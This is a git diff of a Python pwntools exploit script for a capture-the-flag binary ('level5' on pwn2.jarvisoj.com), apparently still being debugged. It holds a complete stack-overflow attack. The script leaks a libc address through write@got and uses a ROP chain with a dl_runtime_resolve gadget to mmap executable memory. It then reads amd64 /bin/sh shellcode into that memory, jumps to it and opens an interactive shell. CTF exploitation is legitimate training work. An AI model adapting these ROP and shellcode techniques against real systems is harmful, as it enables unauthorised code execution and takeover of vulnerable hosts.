@@ -30,19 +30,19 @@ from pwn import *
 
 context.arch = "amd64"
 context.terminal = ['tmux', 'splitw', '-h']
-# context.log_level = 'debug'
+context.log_level = 'debug'
 
-# env = {'LD_PRELOAD':'./libc-2.19.so ./ld-2.19.so'}
 env = {'LD_PRELOAD':'./libc.so.6'}
 
 
 class Pwn(object):
 
     def __init__(self, binary_file=None, remote=None, sign=True):
+        self.remote_sign = sign
         if binary_file:
             self.binary_file = binary_file
             self.main = ELF(self.binary_file)
-            self.libc = './libc.so.6'
+            self.libc = ELF('./libc.so.6')
 
             # some address
             self.write_plt = self.main.symbols['write']
@@ -56,7 +56,7 @@ class Pwn(object):
         
 
     def get_overflow_position(self):
-        io = self.main.process()
+        io = self.main.process(env=env)
         io.recvline()
         io.send(cyclic(600))
         io.recvall()
@@ -111,9 +111,10 @@ class Pwn(object):
 
     
     def get_shell(self):
+        self.rip = 0x88
         self.io = self.get_io()
-        # gdb.attach(self.io, """b *0x4005fd\n continue\n continue\n """)
-        gdb.attach(self.io, """b main""")
+        gdb.attach(self.io, """b *0x4005fd\n continue\n continue\n continue\n""")
+        # gdb.attach(self.io, """b main""")
         # gdb.attach(self.io, """b *0x4005fd\n continue\n""")
         self.io.recvuntil("Input:\n")
 
@@ -128,7 +129,7 @@ class Pwn(object):
                        arg1=1,
                        arg2=self.write_got,
                        arg3=8,
-                       ret_func=self.elf.symbols['main'])
+                       ret_func=self.main.symbols['main'])
         self.write_got_plt = self.io.unpack()
         self.io.recvuntil("Input:\n")
         print "write_got_plt:", hex(self.write_got_plt)
@@ -137,65 +138,81 @@ class Pwn(object):
         self.libc.address = self.write_got_plt - self.libc.symbols['write']
         print 'libc.addres:', hex(self.libc.address)
 
-        pop_rax_ret_addr = self.libc.address + 0x33544
+        # pop_rax_ret_addr = self.libc.address + 0x33544
+        pop_rax_ret_addr = self.libc.address + 0x487a8
         print 'pop_rax_ret_addr:', hex(pop_rax_ret_addr)
 
         self._handle_dl_resolve_()
 
         # 本地高版本ld.so存在防护
         gadgets_addr = None
-        if self.remote_sign:
-            gadgets_addr = self.dl_runtime_resolve_addr_true + 0x35
-        else:
-            gadgets_addr = self.dl_runtime_resolve_addr_true + 0x7a
+        # if self.remote_sign:
+        gadgets_addr = self.dl_runtime_resolve_addr_true + 0x35
+        # else:
+            # gadgets_addr = self.dl_runtime_resolve_addr_true + 0x7a
         print 'godgets_addr:', hex(gadgets_addr)
 
         mmap_addr = self.libc.symbols['mmap64']
 
         shellcode_addr = 0xbeef0000 
+        shellcode_addr = 0x1921000
+        # shellcode_addr = self.main.bss()
 
         # void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
         # mmap[rdi=shellcode_addr, rsi=length(1024), rdx=prot(7), rcx=flags(34), r8=fd(0), r9=offset(0)]
         # stack order: 
         """
         +--------+
-        |   r9   |
+        |   r9   | rsp+0x30 => offset(0)
         +--------+
-        |   r8   |
+        |   r8   | rsp+0x28 => fd(0)
         +--------+
-        |   rdi  |
+        |   rdi  | rsp+0x20 => shellcode_addr
         +--------+
-        |   rsi  |
+        |   rsi  | rsp+0x18 => length(1024)
         +--------+
-        |   rdx  | rsp+0x10
+        |   rdx  | rsp+0x10 => prot(7)
         +--------+
-        |   rcx  | rsp+8 
+        |   rcx  | rsp+8    => flags(34)
         +--------+
         """
-        func_mmap_args = p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0)
-        pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
         print 'execute mmap...'
+        func_mmap_args = p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0)
         payload = 'a' * self.rip + p64(pop_rax_ret_addr) + p64(mmap_addr)
         payload += p64(gadgets_addr)
-        payload += p64(self.elf.symbols['main'])
+        payload += 'a' * 0x48
+        payload += p64(self.main.symbols['main'])
         payload += func_mmap_args
         self.io.send(payload)
-        self.io.recvuntil("Input:\n")
 
         # write shellcode to mmap memory
-        # shellcode = asm(shellcraft.amd64.sh())
-        # self._call_rop(func_got=self.read_plt, 
-                       # arg1=0,
-                       # arg2=shellcode_addr,
-                       # arg3=len(shellcode_addr),
+        print 'starting read shellcode.#############################'
+        print 'shellcode_addr:', hex(shellcode_addr)
+        self.io.recvuntil("Input:\n")
+        shellcode = asm(shellcraft.amd64.sh())
+        self._call_rop(func_got=self.read_got, 
+                       arg1=0,
+                       arg2=shellcode_addr,
+                       arg3=len(shellcode),
                        # ret_func=shellcode_addr)
-        # self.io.interactive()
+                       ret_func=self.main.symbols['main'])
+        print 'sending shellcode...%%%%%%%%%%%%%%%%%%%%%%%%%%%'
+        self.io.send(shellcode)
+        self.io.recvuntil("Input:\n")
+        print 'sending abcd...'
+        # self.io.send('abcd')
+        # self.io.recvuntil('Hello, World!\n')
+
+        self.io.send(fit({self.rip:p64(shellcode_addr)}))
+        # # pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A'
+        # # payload  = pattern + p64(shellcode_addr)
+        self.io.interactive()
 
 
 def main():
-    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=False)
+    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level5', sign=False)
     # pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=True)
-    pwn.get_overflow_position()
+    # pwn.get_overflow_position()
     pwn.get_shell()
 
 
